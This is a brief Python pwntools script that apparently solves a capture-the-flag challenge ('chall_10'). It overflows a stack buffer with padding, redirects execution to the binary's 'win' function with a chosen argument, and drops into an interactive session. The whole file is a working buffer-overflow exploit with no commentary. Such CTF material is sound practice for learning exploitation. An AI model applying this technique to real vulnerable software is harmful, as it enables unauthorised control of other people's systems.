#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_10')

p = process(binary.path)

p.recvline()

payload  = b''
payload += 0x30c * b'A'
payload += p32(binary.sym.win)
payload += p32(0)
payload += p32(0x1a55fac3)

p.sendline(payload)
p.interactive()
